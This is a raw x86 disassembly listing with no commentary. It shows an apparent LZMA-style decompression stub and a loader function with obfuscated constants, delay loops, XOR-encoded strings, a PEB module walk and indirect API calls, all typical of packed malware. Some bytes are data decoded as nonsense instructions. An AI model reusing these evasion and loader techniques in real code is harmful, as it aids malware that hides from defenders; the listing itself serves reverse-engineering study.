  425e16:	mov    esi,DWORD PTR [ebp+0x14]
  425e19:	lods   eax,DWORD PTR ds:[esi]
  425e1a:	xchg   edx,eax
  425e1b:	push   edx
  425e1c:	mov    cl,BYTE PTR [esi-0x2]
  425e1f:	or     eax,0xffffffff
  425e22:	shl    eax,cl
  425e24:	not    eax
  425e26:	push   eax
  425e27:	mov    cl,dh
  425e29:	or     eax,0xffffffff
  425e2c:	shl    eax,cl
  425e2e:	not    eax
  425e30:	push   eax
  425e31:	add    cl,dl
  425e33:	mov    edi,esi
  425e35:	sub    esp,0xc
  425e38:	sub    eax,eax
  425e3a:	inc    eax
  425e3b:	push   eax
  425e3c:	push   eax
  425e3d:	push   eax
  425e3e:	push   eax
  425e3f:	push   eax
  425e40:	push   edi
  425e41:	sub    esi,esi
  425e43:	push   esi
  425e44:	or     ebx,0xffffffff
  425e47:	mov    eax,0x300
  425e4c:	shl    eax,cl
  425e4e:	lea    ecx,[eax+0x736]
  425e54:	mov    eax,0x4000400
  425e59:	shr    ecx,1
  425e5b:	rep stos DWORD PTR es:[edi],eax
  425e5d:	push   0x5
  425e5f:	pop    ecx
  425e60:	call   0x42614b
  425e65:	loop   0x425e60
  425e67:	lea    esi,[esi]
  425e69:	lea    edi,[edi]
  425e6b:	mov    edi,DWORD PTR [ebp-0x4]
  425e6e:	mov    eax,DWORD PTR [ebp-0x10]
  425e71:	sub    edi,DWORD PTR [ebp+0x24]
  425e74:	and    eax,edi
  425e76:	mov    DWORD PTR [ebp-0x18],eax
  425e79:	mov    al,0x0
  425e7b:	call   0x426163
  425e80:	jne    0x425f1b
  425e86:	mov    cl,BYTE PTR [ebp-0xc]
  425e89:	and    edi,DWORD PTR [ebp-0x14]
  425e8c:	shl    edi,cl
  425e8e:	sub    cl,0x8
  425e91:	neg    cl
  425e93:	shr    esi,cl
  425e95:	pop    eax
  425e96:	add    edi,esi
  425e98:	pop    esi
  425e99:	lea    edi,[edi+edi*2]
  425e9c:	shl    edi,0x8
  425e9f:	cmp    al,0x7
  425ea1:	pop    edx
  425ea2:	lea    ecx,[esi+edi*2+0xe6c]
  425ea9:	push   ecx
  425eaa:	push   esi
  425eab:	mov    esi,0x100
  425eb0:	push   eax
  425eb1:	mov    al,0x1
  425eb3:	jb     0x425ee9
  425eb5:	mov    edi,DWORD PTR [ebp-0x4]
  425eb8:	sub    edi,DWORD PTR [ebp-0x24]
  425ebb:	movzx  edi,BYTE PTR [edi]
  425ebe:	mov    ebp,DWORD PTR [ebp-0x34]
  425ec1:	shl    edi,1
  425ec3:	mov    ecx,esi
  425ec5:	and    esi,edi
  425ec7:	add    ecx,esi
  425ec9:	lea    ebp,[ebp+ecx*2+0x0]
  425ecd:	call   0x426182
  425ed2:	mov    ecx,eax
  425ed4:	shr    esi,0x8
  425ed7:	and    ecx,0x1
  425eda:	cmp    esi,ecx
  425edc:	mov    esi,0x100
  425ee1:	jne    0x425ef1
  425ee3:	cmp    eax,esi
  425ee5:	jb     0x425ebe
  425ee7:	jmp    0x425efd
  425ee9:	mov    ebp,DWORD PTR [ebp-0x34]
  425eec:	call   0x426182
  425ef1:	inc    eax
  425ef2:	inc    esi
  425ef3:	sub    eax,0x1
  425ef6:	sub    esi,0x1
  425ef9:	cmp    eax,esi
  425efb:	jb     0x425ee9
  425efd:	pop    edx
  425efe:	inc    edx
  425eff:	cmp    edx,0x5
  425f02:	dec    edx
  425f03:	mov    ecx,edx
  425f05:	jb     0x425f16
  425f07:	inc    edx
  425f08:	cmp    edx,0xb
  425f0b:	dec    edx
  425f0c:	mov    cl,0x4
  425f0e:	dec    cl
  425f10:	jb     0x425f16
  425f12:	mov    cl,0x7
  425f14:	dec    cl
  425f16:	sub    edx,ecx
  425f18:	push   edx
  425f19:	jmp    0x425f6a
  425f1b:	mov    al,0xc1
  425f1d:	dec    al
  425f1f:	call   0x426173
  425f24:	jne    0x425f3a
  425f26:	pop    eax
  425f27:	pop    edi
  425f28:	pop    edx
  425f29:	pop    ecx
  425f2a:	pop    edx
  425f2b:	pop    ecx
  425f2c:	push   DWORD PTR [esp]
  425f2f:	push   ecx
  425f30:	push   edx
  425f31:	mov    edx,0x664
  425f36:	mov    cl,0x0
  425f38:	jmp    0x425fad
  425f3a:	mov    al,0xcd
  425f3c:	dec    al
  425f3e:	call   0x426173
  425f43:	jne    0x425f73
  425f45:	mov    al,0xf1
  425f47:	dec    al
  425f49:	call   0x426163
  425f4e:	jne    0x425fa3
  425f50:	pop    eax
  425f51:	cmp    al,0x7
  425f53:	mov    al,0x9
  425f55:	jb     0x425f59
  425f57:	mov    al,0xb
  425f59:	push   eax
  425f5a:	mov    esi,DWORD PTR [ebp-0x4]
  425f5d:	sub    esi,DWORD PTR [ebp-0x24]
  425f60:	cmp    esi,DWORD PTR [ebp+0x24]
  425f63:	jb     0x42613a
  425f69:	lods   al,BYTE PTR ds:[esi]
  425f6a:	mov    edi,DWORD PTR [ebp-0x4]
  425f6d:	stos   BYTE PTR es:[edi],al
  425f6e:	jmp    0x426101
  425f73:	mov    al,0xd8
  425f75:	call   0x426173
  425f7a:	mov    esi,DWORD PTR [ebp-0x28]
  425f7d:	je     0x425f9a
  425f7f:	mov    al,0xe4
  425f81:	call   0x426173
  425f86:	mov    esi,DWORD PTR [ebp-0x2c]
  425f89:	je     0x425f94
  425f8b:	mov    esi,DWORD PTR [ebp-0x30]
  425f8e:	mov    ecx,DWORD PTR [ebp-0x2c]
  425f91:	mov    DWORD PTR [ebp-0x30],ecx
  425f94:	mov    ecx,DWORD PTR [ebp-0x28]
  425f97:	mov    DWORD PTR [ebp-0x2c],ecx
  425f9a:	mov    ecx,DWORD PTR [ebp-0x24]
  425f9d:	mov    DWORD PTR [ebp-0x28],ecx
  425fa0:	mov    DWORD PTR [ebp-0x24],esi
  425fa3:	pop    eax
  425fa4:	pop    edi
  425fa5:	pop    ecx
  425fa6:	mov    edx,0xa68
  425fab:	mov    cl,0x8
  425fad:	add    edx,edi
  425faf:	push   edx
  425fb0:	push   edi
  425fb1:	cmp    al,0x7
  425fb3:	mov    al,cl
  425fb5:	jb     0x425fb9
  425fb7:	add    al,0x3
  425fb9:	push   eax
  425fba:	mov    ebp,DWORD PTR [ebp-0x34]
  425fbd:	call   0x426180
  425fc2:	jne    0x425fd8
  425fc4:	mov    eax,DWORD PTR [ebp-0x18]
  425fc7:	mov    edi,DWORD PTR [ebp-0x34]
  425fca:	shl    eax,0x3
  425fcd:	sub    ecx,ecx
  425fcf:	push   0x8
  425fd1:	pop    esi
  425fd2:	lea    edi,[edi+eax*2+0x4]
  425fd6:	jmp    0x42600d
  425fd8:	mov    ebp,DWORD PTR [ebp-0x34]
  425fdb:	add    ebp,0x2
  425fde:	call   0x426180
  425fe3:	jne    0x425ffd
  425fe5:	mov    eax,DWORD PTR [ebp-0x18]
  425fe8:	mov    edi,DWORD PTR [ebp-0x34]
  425feb:	shl    eax,0x3
  425fee:	push   0x8
  425ff0:	pop    ecx
  425ff1:	push   0x8
  425ff3:	pop    esi
  425ff4:	lea    edi,[edi+eax*2+0x104]
  425ffb:	jmp    0x42600d
  425ffd:	mov    edi,0x204
  426002:	add    edi,DWORD PTR [ebp-0x34]
  426005:	push   0x10
  426007:	pop    ecx
  426008:	mov    esi,0x100
  42600d:	mov    DWORD PTR [ebp-0x1c],ecx
  426010:	sub    eax,eax
  426012:	inc    eax
  426013:	mov    ebp,edi
  426015:	call   0x426182
  42601a:	mov    ecx,eax
  42601c:	sub    ecx,esi
  42601e:	jb     0x426013
  426020:	add    DWORD PTR [ebp-0x1c],ecx
  426023:	cmp    DWORD PTR [ebp-0x3c],0x4
  426027:	jae    0x4260dd
  42602d:	add    DWORD PTR [ebp-0x3c],0x7
  426031:	mov    ecx,DWORD PTR [ebp-0x1c]
  426034:	cmp    ecx,0x4
  426037:	jb     0x42603c
  426039:	push   0x3
  42603b:	pop    ecx
  42603c:	mov    edi,DWORD PTR [ebp-0x38]
  42603f:	shl    ecx,0x6
  426042:	sub    eax,eax
  426044:	inc    eax
  426045:	push   0x40
  426047:	pop    esi
  426048:	lea    edi,[edi+ecx*2+0x360]
  42604f:	mov    ebp,edi
  426051:	call   0x426182
  426056:	mov    ecx,eax
  426058:	sub    ecx,esi
  42605a:	jb     0x42604f
  42605c:	mov    DWORD PTR [ebp-0x18],ecx
  42605f:	mov    DWORD PTR [ebp-0x24],ecx
  426062:	cmp    ecx,0x4
  426065:	jb     0x4260da
  426067:	mov    esi,ecx
  426069:	and    DWORD PTR [ebp-0x24],0x1
  42606d:	shr    esi,1
  42606f:	or     DWORD PTR [ebp-0x24],0x2
  426073:	dec    esi
  426074:	cmp    ecx,0xe
  426077:	jae    0x426092
  426079:	mov    eax,0x2af
  42607e:	sub    eax,ecx
  426080:	mov    ecx,esi
  426082:	shl    BYTE PTR [ebp-0x24],cl
  426085:	add    eax,DWORD PTR [ebp-0x24]
  426088:	shl    eax,1
  42608a:	add    eax,DWORD PTR [ebp-0x38]
  42608d:	mov    DWORD PTR [ebp-0x34],eax
  426090:	jmp    0x4260bf
  426092:	sub    esi,0x4
  426095:	call   0x42613f
  42609a:	shr    ebx,1
  42609c:	shl    DWORD PTR [ebp-0x24],1
  42609f:	cmp    DWORD PTR [ebp-0x20],ebx
  4260a2:	jb     0x4260aa
  4260a4:	inc    DWORD PTR [ebp-0x24]
  4260a7:	sub    DWORD PTR [ebp-0x20],ebx
  4260aa:	dec    esi
  4260ab:	jne    0x426095
  4260ad:	mov    eax,0x644
  4260b2:	add    eax,DWORD PTR [ebp-0x38]
  4260b5:	mov    DWORD PTR [ebp-0x34],eax
  4260b8:	shl    DWORD PTR [ebp-0x24],0x4
  4260bc:	push   0x4
  4260be:	pop    esi
  4260bf:	sub    edi,edi
  4260c1:	inc    edi
  4260c2:	mov    eax,edi
  4260c4:	mov    ebp,DWORD PTR [ebp-0x34]
  4260c7:	call   0x426182
  4260cc:	test   al,0x1
  4260ce:	je     0x4260d3
  4260d0:	or     DWORD PTR [ebp-0x24],edi
  4260d3:	shl    edi,1
  4260d5:	dec    esi
  4260d6:	jne    0x4260c4
  4260d8:	jmp    0x4260da
  4260da:	inc    DWORD PTR [ebp-0x24]
  4260dd:	mov    ecx,DWORD PTR [ebp-0x1c]
  4260e0:	add    ecx,0x2
  4260e3:	mov    edi,DWORD PTR [ebp-0x4]
  4260e6:	mov    eax,edi
  4260e8:	sub    eax,DWORD PTR [ebp+0x24]
  4260eb:	cmp    DWORD PTR [ebp-0x24],eax
  4260ee:	ja     0x42613a
  4260f0:	mov    esi,edi
  4260f2:	sub    esi,DWORD PTR [ebp-0x24]
  4260f5:	mov    edx,DWORD PTR [ebp+0x28]
  4260f8:	lods   al,BYTE PTR ds:[esi]
  4260f9:	stos   BYTE PTR es:[edi],al
  4260fa:	cmp    edi,edx
  4260fc:	jae    0x426101
  4260fe:	dec    ecx
  4260ff:	jne    0x4260f8
  426101:	mov    DWORD PTR [ebp-0x4],edi
  426104:	movzx  esi,al
  426107:	cmp    edi,DWORD PTR [ebp+0x28]
  42610a:	jb     0x425e6b
  426110:	call   0x42613f
  426115:	sub    eax,eax
  426117:	lea    ebp,[esp+0x3c]
  42611b:	mov    edx,DWORD PTR [ebp+0x20]
  42611e:	mov    esi,DWORD PTR [ebp-0x8]
  426121:	sub    esi,DWORD PTR [ebp+0x18]
  426124:	mov    DWORD PTR [edx],esi
  426126:	mov    dh,0xdd
  426128:	cmp    BYTE PTR [esi+0x7d347b7d],dh
  42612e:	sbb    BYTE PTR [esi+0x1f5af70],ch
  426134:	add    eax,0x188f893
  426139:	jmp    0x37cbec72
  42613e:	jmp    0x4260ce
  426140:	ja     0x4260ca
  426142:	mov    BYTE PTR [eax-0x6873ae74],cl
  426148:	(bad)  
  426149:	pop    ss
  42614a:	test   al,0xe1
  42614c:	mov    dh,0x5d
  42614e:	imul   esi,DWORD PTR [ebp+ebx*2-0x8],0x55
  426153:	sbb    esi,DWORD PTR [esi+0xb8f0b9d]
  426159:	test   al,0x3a
  42615b:	scas   al,BYTE PTR es:[edi]
  42615c:	popf   
  42615d:	or     ebp,DWORD PTR [esi-0x68fe94a3]
  426163:	mov    dh,0xbd
  426165:	fwait
  426166:	les    esp,FWORD PTR [edx-0x75]
  426169:	(bad)  
  42616a:	sets   BYTE PTR [ebp+ebx*4+0x378f942b]
  426172:	mov    al,ds:0x948b62c4
  426177:	popf   
  426178:	fwait
  426179:	mov    dh,0x3d
  42617b:	stos   DWORD PTR es:[edi],eax
  42617c:	mov    esi,0x34889d39
  426181:	mov    edi,DWORD PTR [esi-0x717762c7]
  426187:	ja     0x426111
  426189:	mov    BYTE PTR [eax-0x4907aa74],cl
  42618f:	mov    ecx,0x198f6818
  426194:	sbb    BYTE PTR [eax],cl
  426196:	test   al,0x74
  426198:	mov    ecx,0xfa55f918
  42619d:	mov    dl,0xcc
  42619f:	xchg   DWORD PTR [ecx+0x178f6818],ebx
  4261a5:	test   al,0x88
  4261a7:	push   esp
  4261a8:	and    al,0x20
  4261aa:	mov    ecx,ebx
  4261ac:	movzx  edx,WORD PTR [ebp+0x0]
  4261b0:	shr    ecx,0xb
  4261b3:	imul   ecx,edx
  4261b6:	cmp    DWORD PTR [esp+0x20],ecx
  4261ba:	jae    0x4261d3
  4261bc:	mov    ebx,ecx
  4261be:	mov    ecx,0x800
  4261c3:	sub    ecx,edx
  4261c5:	shr    ecx,0x5
  4261c8:	add    WORD PTR [ebp+0x0],cx
  4261cc:	add    eax,eax
  4261ce:	lea    ebp,[esp+0x40]
  4261d2:	ret    
  4261d3:	shr    edx,0x5
  4261d6:	sub    DWORD PTR [esp+0x20],ecx
  4261da:	sub    ebx,ecx
  4261dc:	sub    WORD PTR [ebp+0x0],dx
  4261e0:	add    eax,eax
  4261e2:	add    eax,0x1
  4261e5:	lea    ebp,[esp+0x40]
  4261e9:	ret    
  4261ea:	push   ebp
  4261eb:	mov    ebp,esp
  4261ed:	sub    esp,0x12c
  4261f3:	push   ebx
  4261f4:	push   esi
  4261f5:	push   edi
  4261f6:	mov    DWORD PTR [ebp-0x10],0xf89c85a5
  4261fd:	mov    DWORD PTR [ebp-0x18],0xf89c85a2
  426204:	mov    eax,DWORD PTR [ebp+0x8]
  426207:	mov    DWORD PTR [ebp+0x8],eax
  42620a:	mov    ecx,DWORD PTR [ebp-0x10]
  42620d:	mov    ebx,0x75108ae
  426212:	xor    ecx,ebx
  426214:	mov    eax,0x3272f5
  426219:	add    ecx,eax
  42621b:	mov    DWORD PTR [ebp-0x24],ecx
  42621e:	mov    ecx,DWORD PTR [ebp-0x10]
  426221:	xor    ecx,ebx
  426223:	add    ecx,eax
  426225:	mov    DWORD PTR [ebp-0x40],ecx
  426228:	mov    ecx,DWORD PTR [ebp-0x10]
  42622b:	xor    ecx,ebx
  42622d:	add    ecx,eax
  42622f:	mov    DWORD PTR [ebp-0x3c],ecx
  426232:	mov    ecx,DWORD PTR [ebp-0x10]
  426235:	xor    ecx,ebx
  426237:	add    ecx,eax
  426239:	mov    DWORD PTR [ebp-0xd8],ecx
  42623f:	mov    DWORD PTR [ebp-0x50],0xf89f05a5
  426246:	mov    DWORD PTR [ebp-0x3c],0xf89cb5a5
  42624d:	mov    DWORD PTR [ebp-0x54],0xf89c85a1
  426254:	push   0x25
  426256:	pop    ecx
  426257:	mov    DWORD PTR [ebp-0x30],ecx
  42625a:	mov    DWORD PTR [ebp-0x30],ecx
  42625d:	push   0x65
  42625f:	pop    ecx
  426260:	mov    DWORD PTR [ebp-0x30],ecx
  426263:	mov    DWORD PTR [ebp-0x30],ecx
  426266:	mov    DWORD PTR [ebp-0x30],0x4d
  42626d:	mov    DWORD PTR [ebp-0x30],0x43
  426274:	mov    ecx,DWORD PTR [ebp-0x10]
  426277:	xor    ecx,ebx
  426279:	add    ecx,eax
  42627b:	mov    DWORD PTR [ebp-0x30],ecx
  42627e:	mov    ecx,DWORD PTR [ebp-0x10]
  426281:	xor    ecx,ebx
  426283:	add    ecx,eax
  426285:	mov    DWORD PTR [ebp-0x30],ecx
  426288:	mov    DWORD PTR [ebp-0x28],0x258
  42628f:	mov    DWORD PTR [ebp-0x34],0x36
  426296:	mov    DWORD PTR [ebp-0x14],0x7a
  42629d:	lea    edi,[ebp-0x10c]
  4262a3:	lea    esi,[ebp-0x12c]
  4262a9:	call   0x426f69
  4262ae:	dec    DWORD PTR [ebp-0x14]
  4262b1:	jne    0x42629d
  4262b3:	dec    DWORD PTR [ebp-0x34]
  4262b6:	jne    0x426296
  4262b8:	dec    DWORD PTR [ebp-0x28]
  4262bb:	jne    0x42628f
  4262bd:	mov    DWORD PTR [ebp-0x28],0x400e
  4262c4:	mov    eax,DWORD PTR [ebp-0x10]
  4262c7:	xor    eax,ebx
  4262c9:	mov    esi,0x3272f5
  4262ce:	add    eax,esi
  4262d0:	mov    DWORD PTR [ebp-0x1c],eax
  4262d3:	mov    eax,DWORD PTR [ebp-0x10]
  4262d6:	and    DWORD PTR [ebp-0x94],0x0
  4262dd:	xor    eax,ebx
  4262df:	add    eax,esi
  4262e1:	mov    DWORD PTR [ebp-0x38],eax
  4262e4:	mov    eax,fs:0x18
  4262ea:	mov    DWORD PTR [ebp-0x94],eax
  4262f0:	mov    eax,DWORD PTR [eax+0x30]
  4262f3:	mov    DWORD PTR [ebp-0xcc],eax
  4262f9:	mov    eax,DWORD PTR [eax+0xc]
  4262fc:	mov    DWORD PTR [ebp-0xc0],eax
  426302:	mov    eax,DWORD PTR [ebp+0x8]
  426305:	lea    ecx,[ebp-0x94]
  42630b:	mov    DWORD PTR [eax+0x1a0],ecx
  426311:	mov    eax,DWORD PTR [ebp+0x8]
  426314:	lea    ecx,[ebp-0xcc]
  42631a:	mov    DWORD PTR [eax+0x1a4],ecx
  426320:	mov    eax,DWORD PTR [ebp+0x8]
  426323:	push   DWORD PTR [ebp+0x8]
  426326:	lea    ecx,[ebp-0xc0]
  42632c:	mov    DWORD PTR [eax+0x1a8],ecx
  426332:	call   0x42872a
  426337:	mov    ecx,DWORD PTR [ebp-0x10]
  42633a:	xor    ecx,ebx
  42633c:	add    ecx,esi
  42633e:	cmp    ecx,eax
  426340:	je     0x4266c3
  426346:	mov    eax,DWORD PTR [ebp+0x8]
  426349:	mov    eax,DWORD PTR [eax+0x194]
  42634f:	mov    ecx,DWORD PTR [eax]
  426351:	mov    eax,DWORD PTR [ebp+0x8]
  426354:	mov    eax,DWORD PTR [eax+0x194]
  42635a:	mov    eax,DWORD PTR [eax]
  42635c:	add    eax,DWORD PTR [ecx+0x3c]
  42635f:	mov    ecx,DWORD PTR [ebp+0x8]
  426362:	mov    ecx,DWORD PTR [ecx+0x1e0]
  426368:	lea    edx,[ebp-0xec]
  42636e:	push   edx
  42636f:	mov    edx,DWORD PTR [ebp+0x8]
  426372:	mov    edx,DWORD PTR [edx+0x18c]
  426378:	mov    edx,DWORD PTR [edx]
  42637a:	add    edx,DWORD PTR [eax+0x88]
  426380:	push   0x4
  426382:	push   DWORD PTR [eax+0x8c]
  426388:	push   edx
  426389:	call   DWORD PTR [ecx+0x1c]
  42638c:	push   DWORD PTR [ebp+0x8]
  42638f:	xor    eax,eax
  426391:	mov    DWORD PTR [ebp-0xa8],0x1b3e0e38
  42639b:	mov    DWORD PTR [ebp-0xa4],0x12371120
  4263a5:	mov    DWORD PTR [ebp-0xa0],0x40111c0a
  4263af:	mov    BYTE PTR [ebp-0x9c],0x83
  4263b6:	lea    edi,[ebp-0x9b]
  4263bc:	stos   DWORD PTR es:[edi],eax
  4263bd:	stos   WORD PTR es:[edi],ax
  4263bf:	stos   BYTE PTR es:[edi],al
  4263c0:	xor    eax,eax
  4263c2:	mov    DWORD PTR [ebp-0xbc],0x1b3e0e38
  4263cc:	mov    DWORD PTR [ebp-0xb8],0x12371120
  4263d6:	mov    DWORD PTR [ebp-0xb4],0x2a111c0a
  4263e0:	mov    BYTE PTR [ebp-0xb0],0x83
  4263e7:	lea    edi,[ebp-0xaf]
  4263ed:	stos   DWORD PTR es:[edi],eax
  4263ee:	stos   WORD PTR es:[edi],ax
  4263f0:	stos   BYTE PTR es:[edi],al
  4263f1:	mov    edi,DWORD PTR [ebp+0x8]
  4263f4:	mov    eax,DWORD PTR [ebp+0x8]
  4263f7:	mov    edx,DWORD PTR [eax+0x1b8]
  4263fd:	mov    DWORD PTR [ebp-0x68],0x110f0e17
  426404:	mov    DWORD PTR [ebp-0x64],0x1813141e
  42640b:	mov    WORD PTR [ebp-0x60],0x8340
  426411:	mov    DWORD PTR [ebp-0x90],0x1b3e0e38
  42641b:	mov    DWORD PTR [ebp-0x8c],0x17401120
  426425:	mov    DWORD PTR [ebp-0x88],0x35201b13
  42642f:	mov    DWORD PTR [ebp-0x84],0x111c140c
  426439:	mov    DWORD PTR [ebp-0x80],0x83401e18
  426440:	mov    DWORD PTR [ebp-0x7c],0x1b3e0e38
  426447:	mov    DWORD PTR [ebp-0x78],0x17401120
  42644e:	mov    DWORD PTR [ebp-0x74],0x35201b13
  426455:	mov    DWORD PTR [ebp-0x70],0x111c140c
  42645c:	mov    DWORD PTR [ebp-0x6c],0x832a1e18
  426463:	call   0x428759
  426468:	push   eax
  426469:	mov    eax,DWORD PTR [ebp+0x8]
  42646c:	mov    eax,DWORD PTR [eax+0x1a8]
  426472:	push   DWORD PTR [eax]
  426474:	call   0x4283fa
  426479:	test   eax,eax
  42647b:	jne    0x4264cd
  42647d:	mov    eax,DWORD PTR [ebp+0x8]
  426480:	mov    eax,DWORD PTR [eax+0x1e0]
  426486:	mov    edi,DWORD PTR [ebp+0x8]
  426489:	add    eax,0x4
  42648c:	mov    DWORD PTR [ebp-0x20],eax
  42648f:	mov    eax,DWORD PTR [ebp+0x8]
  426492:	mov    edx,DWORD PTR [eax+0x1b8]
  426498:	call   0x428759
  42649d:	push   eax
  42649e:	mov    eax,DWORD PTR [ebp-0x20]
  4264a1:	call   DWORD PTR [eax]
  4264a3:	test   eax,eax
  4264a5:	jne    0x4264cd
  4264a7:	mov    eax,DWORD PTR [ebp+0x8]
  4264aa:	mov    eax,DWORD PTR [eax+0x1e0]
  4264b0:	mov    edi,DWORD PTR [ebp+0x8]
  4264b3:	add    eax,0x10
  4264b6:	mov    DWORD PTR [ebp-0x20],eax
  4264b9:	mov    eax,DWORD PTR [ebp+0x8]
  4264bc:	mov    edx,DWORD PTR [eax+0x1b8]
  4264c2:	call   0x428759
  4264c7:	push   eax
  4264c8:	mov    eax,DWORD PTR [ebp-0x20]
  4264cb:	call   DWORD PTR [eax]
  4264cd:	mov    eax,DWORD PTR [ebp-0x10]
  4264d0:	mov    ecx,DWORD PTR [ebp-0x28]
  4264d3:	xor    eax,ebx
  4264d5:	add    eax,esi
  4264d7:	cmp    eax,ecx
  4264d9:	je     0x42669c
  4264df:	mov    eax,DWORD PTR [ebp-0x18]
  4264e2:	xor    eax,ebx
  4264e4:	mov    ecx,0xffcd8d0b
  4264e9:	sub    ecx,eax
  4264eb:	add    ecx,DWORD PTR [ebp-0x28]
  4264ee:	mov    eax,DWORD PTR [ebp-0x1c]
  4264f1:	cmp    eax,ecx
  4264f3:	ja     0x42669c
  4264f9:	mov    DWORD PTR [ebp-0x34],0x0
  426500:	push   DWORD PTR [ebp+0x8]
  426503:	mov    edi,DWORD PTR [ebp+0x8]
  426506:	mov    eax,DWORD PTR [ebp+0x8]
  426509:	mov    edx,DWORD PTR [eax+0x1b4]
  42650f:	call   0x428759
  426514:	push   eax
  426515:	mov    eax,DWORD PTR [ebp+0x8]
  426518:	mov    eax,DWORD PTR [eax+0x1a8]
  42651e:	push   DWORD PTR [eax]
  426520:	call   0x4283fa
  426525:	mov    ecx,DWORD PTR [ebp+0x8]
  426528:	mov    ecx,DWORD PTR [ecx+0x19c]
  42652e:	mov    DWORD PTR [ecx],eax
  426530:	mov    eax,DWORD PTR [ebp+0x8]
  426533:	mov    edi,DWORD PTR [eax+0x1e0]
  426539:	mov    esi,DWORD PTR [ebp+0x8]
  42653c:	xor    eax,eax
  42653e:	lea    edx,[ebp-0x7c]
  426541:	call   0x42878f
  426546:	push   eax
  426547:	mov    eax,DWORD PTR [ebp+0x8]
  42654a:	mov    eax,DWORD PTR [eax+0x19c]
  426550:	push   DWORD PTR [eax]
  426552:	call   DWORD PTR [edi+0x8]
  426555:	mov    DWORD PTR [ebp-0x20],eax
  426558:	mov    eax,DWORD PTR [ebp+0x8]
  42655b:	mov    edi,DWORD PTR [eax+0x1e0]
  426561:	mov    esi,DWORD PTR [ebp+0x8]
  426564:	xor    eax,eax
  426566:	lea    edx,[ebp-0x90]
  42656c:	call   0x42878f
  426571:	push   eax
  426572:	mov    eax,DWORD PTR [ebp+0x8]
  426575:	mov    eax,DWORD PTR [eax+0x19c]
  42657b:	push   DWORD PTR [eax]
  42657d:	call   DWORD PTR [edi+0x8]
  426580:	mov    eax,DWORD PTR [ebp+0x8]
  426583:	mov    edi,DWORD PTR [eax+0x1e0]
  426589:	mov    esi,DWORD PTR [ebp+0x8]
  42658c:	xor    eax,eax
  42658e:	lea    edx,[ebp-0xa8]
  426594:	call   0x42878f
  426599:	push   eax
  42659a:	mov    eax,DWORD PTR [ebp+0x8]
  42659d:	mov    eax,DWORD PTR [eax+0x19c]
  4265a3:	push   DWORD PTR [eax]
  4265a5:	call   DWORD PTR [edi+0x8]
  4265a8:	and    DWORD PTR [ebp-0x8],0x0
  4265ac:	mov    DWORD PTR [ebp-0x48],eax
  4265af:	mov    eax,DWORD PTR [ebp-0x8]
  4265b2:	and    eax,0x7
  4265b5:	add    eax,0x31
  4265b8:	push   eax
  4265b9:	call   DWORD PTR [ebp-0x20]
  4265bc:	test   eax,eax
  4265be:	je     0x426602
  4265c0:	mov    eax,DWORD PTR [ebp-0x8]
  4265c3:	push   0x19
  4265c5:	xor    edx,edx
  4265c7:	pop    ecx
  4265c8:	div    ecx
  4265ca:	add    dl,0x41
  4265cd:	movzx  eax,dl
  4265d0:	push   eax
  4265d1:	call   DWORD PTR [ebp-0x48]
  4265d4:	test   eax,eax
  4265d6:	jne    0x426602
  4265d8:	mov    eax,DWORD PTR [ebp+0x8]
  4265db:	mov    edi,DWORD PTR [eax+0x1e0]
  4265e1:	mov    esi,DWORD PTR [ebp+0x8]
  4265e4:	xor    eax,eax
  4265e6:	lea    edx,[ebp-0x68]
  4265e9:	call   0x42878f
  4265ee:	push   eax
  4265ef:	mov    eax,DWORD PTR [ebp+0x8]
  4265f2:	mov    eax,DWORD PTR [eax+0x198]
  4265f8:	push   DWORD PTR [eax]
  4265fa:	call   DWORD PTR [edi+0x8]
  4265fd:	mov    DWORD PTR [ebp-0x14],eax
  426600:	jmp    0x426606
  426602:	and    DWORD PTR [ebp-0x14],0x0
  426606:	inc    DWORD PTR [ebp-0x8]
  426609:	cmp    DWORD PTR [ebp-0x8],0x10
  42660d:	jb     0x4265af
  42660f:	mov    eax,DWORD PTR [ebp-0x18]
  426612:	mov    esi,DWORD PTR [ebp+0x8]
  426615:	xor    eax,ebx
  426617:	mov    edi,0x3272f5
  42661c:	add    eax,edi
  42661e:	lea    edx,[ebp-0x10c]
  426624:	call   0x42878f
  426629:	push   eax
  42662a:	mov    eax,DWORD PTR [ebp-0x10]
  42662d:	mov    esi,DWORD PTR [ebp+0x8]
  426630:	xor    eax,ebx
  426632:	add    eax,edi
  426634:	lea    edx,[ebp-0x12c]
  42663a:	call   0x42878f
  42663f:	push   eax
  426640:	call   DWORD PTR [ebp-0x14]
  426643:	mov    ecx,DWORD PTR [ebp-0x10]
  426646:	xor    ecx,ebx
  426648:	add    ecx,edi
  42664a:	cmp    ecx,eax
  42664c:	jne    0x426655
  42664e:	mov    DWORD PTR [ebp-0x34],0x1
  426655:	mov    eax,DWORD PTR [ebp-0x18]
  426658:	mov    ecx,DWORD PTR [ebp-0x1c]
  42665b:	xor    eax,ebx
  42665d:	lea    eax,[eax+ecx*1+0x3272f5]
  426664:	mov    DWORD PTR [ebp-0x1c],eax
  426667:	mov    eax,DWORD PTR [ebp-0x34]
  42666a:	test   eax,eax
  42666c:	je     0x426680
  42666e:	mov    eax,DWORD PTR [ebp-0x18]
  426671:	mov    ecx,DWORD PTR [ebp-0x38]
  426674:	xor    eax,ebx
  426676:	lea    eax,[eax+ecx*1+0x3272f5]
  42667d:	mov    DWORD PTR [ebp-0x38],eax
  426680:	mov    eax,DWORD PTR [ebp-0x18]
  426683:	xor    eax,ebx
  426685:	mov    ecx,0xffcd8d0b
  42668a:	sub    ecx,eax
  42668c:	add    ecx,DWORD PTR [ebp-0x28]
  42668f:	mov    eax,DWORD PTR [ebp-0x1c]
  426692:	cmp    eax,ecx
  426694:	jbe    0x4264f9
  42669a:	mov    esi,edi
  42669c:	mov    eax,DWORD PTR [ebp-0x38]
  42669f:	mov    ecx,DWORD PTR [ebp-0x1c]
  4266a2:	cmp    ecx,eax
  4266a4:	jne    0x4266b7
  4266a6:	push   DWORD PTR [ebp+0x8]
  4266a9:	lea    eax,[ebp-0x40]
  4266ac:	push   eax
  4266ad:	call   0x4291fe
  4266b2:	mov    DWORD PTR [ebp-0x24],eax
  4266b5:	jmp    0x4266c3
  4266b7:	mov    eax,DWORD PTR [ebp-0x24]
  4266ba:	mov    ecx,DWORD PTR [ebp-0x18]
  4266bd:	xor    ecx,ebx
  4266bf:	add    ecx,esi
  4266c1:	xor    DWORD PTR [eax],ecx
  4266c3:	mov    eax,DWORD PTR [ebp-0x10]
  4266c6:	mov    ecx,DWORD PTR [ebp-0x24]
  4266c9:	xor    eax,ebx
  4266cb:	add    eax,esi
  4266cd:	cmp    eax,ecx
  4266cf:	je     0x426e47
  4266d5:	mov    eax,DWORD PTR [ebp-0x10]
